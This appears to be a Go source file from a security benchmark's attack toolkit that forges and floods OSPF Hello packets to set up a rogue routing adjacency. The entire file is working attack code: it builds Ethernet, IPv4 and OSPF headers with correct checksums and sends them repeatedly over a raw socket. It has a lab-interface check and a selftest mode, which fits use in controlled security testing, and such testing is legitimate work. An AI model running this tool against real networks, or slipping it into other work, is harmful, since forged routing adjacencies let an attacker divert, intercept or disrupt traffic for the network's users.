package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"

	"github.com/rohanpunj/iolbox/tools/secbench-attacks-go/internal/attackcommon"
)

const ospfProto = 89

func internetChecksum(data []byte) uint16 {
	var sum uint32
	for len(data) >= 2 {
		sum += uint32(binary.BigEndian.Uint16(data[:2]))
		data = data[2:]
	}
	if len(data) == 1 {
		sum += uint32(data[0]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

func buildHello(area int, routerID string, srcMAC net.HardwareAddr) ([]byte, error) {
	srcIP := net.ParseIP(routerID).To4()
	if srcIP == nil {
		return nil, fmt.Errorf("invalid IPv4 router ID %q", routerID)
	}
	if area < 0 {
		return nil, fmt.Errorf("invalid OSPF area %d", area)
	}

	// OSPF_Hello(mask, hellointerval, options, prio, deadinterval, router, backup).
	hello := make([]byte, 20)
	copy(hello[0:4], net.IPv4(255, 255, 255, 0).To4())
	binary.BigEndian.PutUint16(hello[4:6], 10)
	hello[6] = 2
	hello[7] = 1
	binary.BigEndian.PutUint32(hello[8:12], 40)
	copy(hello[12:16], srcIP)

	// OSPF_Hdr(version=2,type=1,src,area,authtype=0,authdata=0).
	message := make([]byte, 24+len(hello))
	message[0] = 2
	message[1] = 1
	binary.BigEndian.PutUint16(message[2:4], uint16(len(message)))
	copy(message[4:8], srcIP)
	binary.BigEndian.PutUint32(message[8:12], uint32(area))
	// The Hello body itself — without this, message[24:] stays the zeroed
	// bytes from make() and only the checksum (computed from `hello`
	// directly, below) would reflect the real Hello fields.
	copy(message[24:], hello)
	// Checksum excludes authdata bytes 16-23, exactly as Scapy's OSPF_Hdr does.
	checksumData := make([]byte, 16+len(hello))
	copy(checksumData[:16], message[:16])
	copy(checksumData[16:], hello)
	binary.BigEndian.PutUint16(message[12:14], internetChecksum(checksumData))

	frame := make([]byte, 14)
	copy(frame[0:6], []byte{0x01, 0x00, 0x5e, 0x00, 0x00, 0x05})
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], 0x0800)
	frame = append(frame, attackcommon.BuildIPv4(srcIP, net.IPv4(224, 0, 0, 5), ospfProto, message)...)
	return frame, nil
}

func run() int {
	fs, common := attackcommon.BaseParser("OSPF rogue adjacency: flood forged Hello packets")
	area := fs.Int("area", 0, "")
	routerID := fs.String("router_id", "9.9.9.9", "")
	if err := fs.Parse(os.Args[1:]); err != nil {
		return 2
	}
	if err := attackcommon.EnforceLabIface(common.Iface); err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 2
	}

	srcMAC := attackcommon.InterfaceMAC(common.Iface)
	frame, err := buildHello(*area, *routerID, srcMAC)
	if err != nil {
		attackcommon.Status("FATAL", fmt.Sprintf("OSPF packet build failed: %v", err))
		return 1
	}
	if common.Selftest {
		attackcommon.SelftestOK("ospf_rogue", fmt.Sprintf("OSPF Hello len=%d", len(frame)))
		return 0
	}

	sender, err := attackcommon.OpenRawSender(common.Iface)
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	defer sender.Close()

	_, err = attackcommon.RunLoop(common.Count, common.Interval, func(n int) error {
		frame, err := buildHello(*area, *routerID, srcMAC)
		if err != nil {
			return err
		}
		if err := sender.Send(frame); err != nil {
			return fmt.Errorf("send OSPF frame: %w", err)
		}
		attackcommon.Status("SENT", fmt.Sprintf("OSPF Hello #%d area=%d router-id=%s", n+1, *area, *routerID))
		return nil
	})
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	return 0
}

func main() {
	os.Exit(run())
}
